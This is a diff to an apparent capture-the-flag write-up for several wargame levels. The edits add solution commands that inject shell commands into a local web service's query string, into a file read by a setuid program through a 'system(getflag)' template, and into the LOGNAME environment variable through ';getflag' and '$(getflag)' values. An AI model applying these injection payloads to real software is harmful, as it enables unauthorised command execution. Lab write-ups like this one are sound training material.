@@ -423,7 +423,7 @@ Connection to localhost 4747 port [tcp/*] succeeded!
 # solve
 > curl localhost:4747/?x="\`$(which getflag)\`"
 or
-> echo -e "GET /?x=\`$(which getflag)\` HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4747
+> curl --get --data-urlencode 'x=;getflag' http://localhost:4747
 ```
 
 
@@ -599,6 +599,9 @@ Solution
 # echo $(oneliner) > /tmp/temp - push it to a FILE
 
 > echo '[x ${`getflag`}]' > /tmp/temp
+   OR
+> echo '[x {${system(getflag)}}]' > /tmp/tmp
+   THEN
 > ./level06 /tmp/temp
 ```
 
@@ -692,8 +695,9 @@ uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
 Solution
 ```b
 > export LOGNAME='$(getflag)'
-    or
+> export LOGNAME=";getflag"
 > export LOGNAME='`getflag`'
+   THEN
 > ./level07
 ```
 
